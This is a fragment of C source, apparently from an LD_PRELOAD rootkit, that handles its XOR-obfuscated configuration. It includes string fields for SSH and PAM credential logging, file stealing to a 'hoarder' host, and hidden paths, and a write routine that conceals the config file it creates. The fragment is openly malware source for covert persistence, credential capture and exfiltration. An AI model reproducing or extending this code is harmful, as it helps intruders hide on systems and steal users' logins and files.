/* (un/re/)xor given strings in bdvcfg_t pointer. if targets & targetsize are 0, *all* strings are targeted.
 * otherwise, up to targetsize elements of the specified strings from the targets pointer are targeted.
 * there is a macro in bdv.c which makes this simpler, targeting all strings from the get go. */
void _xorbdvcfg(bdvcfg_t *bc, char *const *targets, const size_t targetsize){
    if(targets == NULL && targetsize == 0){
        char *const uxor[] = {
            #ifdef OUTGOING_SSH_LOGGING
             bc->sshlogs,
            #endif
            #ifdef ENABLE_STEAL
             bc->interestdir,
            #endif
            #ifdef PAM_AUTH_LOGGING
             bc->logpath,
            #endif
            #ifdef HIDE_MY_ASS
             bc->asspath,
            #endif
            #if defined ENABLE_STEAL && defined HOARDER_HOST
             bc->hoarder_host,
            #endif
            #ifdef USE_MAGIC_ATTR
             bc->magicattr,
            #endif
             bc->installdir,
             bc->homedir,
             bc->preloadpath,
             bc->bdvlso,
             bc->bdvar
        };

        for(size_t i=0; i<sizeofarr(uxor); i++)
            xor(uxor[i]);

        return;
    }

    for(size_t i=0; i<targetsize; i++)
        xor(targets[i]);
}

/* reads bdvcfg_t from path. unxors each string.
 * NULL is returned if either:   path could not be opened,
 *                               could not allocate memory for bdvcfg_t,
 *                               bytes read is <1.
 * if path is NULL, the target is assumed to be BDVL_CONFIG. */
bdvcfg_t *readbdvcfg(const char *path){
    hook(CFOPEN, CFREAD);

    char *target;
    if(!path) target = xordup(BDVL_CONFIG);
    else      target = strdup(path);
    if(!target) return NULL;

    FILE *fp = call(CFOPEN, target, "rb");
    clean(target);
    if(!fp) return NULL;

    bdvcfg_t *ret = calloc(1, sizeof(bdvcfg_t));
    if(!ret){
        fclose(fp);
        return NULL;
    }
    size_t n = (size_t)call(CFREAD, ret, 1, sizeof(bdvcfg_t), fp);
    if(n == 0 || ferror(fp)){
        free(ret);
        ret = NULL;
    }else xorbdvcfg(ret);
    fclose(fp);
    return ret;
}

/* write (already xor'd) bdvcfg_t to path. 0 or -1 is returned on failure & path unlinked.
 * if path is NULL then BDVL_CONFIG is the default target path. */
size_t writebdvcfg(const bdvcfg_t *bc, const char *path){
    hook(CFOPEN, CFWRITE, CCHMOD);

    char *target;
    if(!path) target = xordup(BDVL_CONFIG);
    else      target = strdup(path);
    if(!target) return 0;

    FILE *fp = call(CFOPEN, target, "wb");
    if(!fp){
        clean(target);
        return 0;
    }
    size_t ret = (size_t)call(CFWRITE, bc, 1, sizeof(bdvcfg_t), fp);
    fflush(fp);
    fclose(fp);

    if(ret > 0){
        hide_path(target);
        call(CCHMOD, target, 0666);
    }else rm(target);
    clean(target);
    return ret;
}